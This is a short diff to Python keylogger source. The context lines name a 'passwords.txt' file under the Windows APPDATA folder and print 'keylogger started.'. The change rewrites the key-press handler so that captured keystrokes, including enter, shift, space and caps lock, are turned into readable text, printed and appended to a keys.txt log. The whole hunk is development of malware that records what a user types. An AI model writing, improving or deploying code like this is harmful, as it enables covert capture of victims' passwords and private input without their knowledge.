@@ -8,11 +8,17 @@ file_to_write = os.environ['appdata'] + '\\passwords.txt'    # for running on Wi
 
 print("keylogger started.")
 def on_press(key):
-
-    key = str(key).replace("Key.backspace", "Backspace")
-
+    k = str(key)
+    k = k.replace("'", " ")
+    k = k.replace("Key.backspace", "Backspace")
+    k = k.replace("Key.enter", "\n")
+    k = k.replace("Key.shift", "Shift")
+    k = k.replace("Key.space", " ")
+    k = k.replace("Key.caps_lock", "Caps Lock")
+    
+    print(k)
     file = open("keys.txt", "a")
-    file.write(key)
+    file.write(k)
     file.write('\n')
     file.close()
 
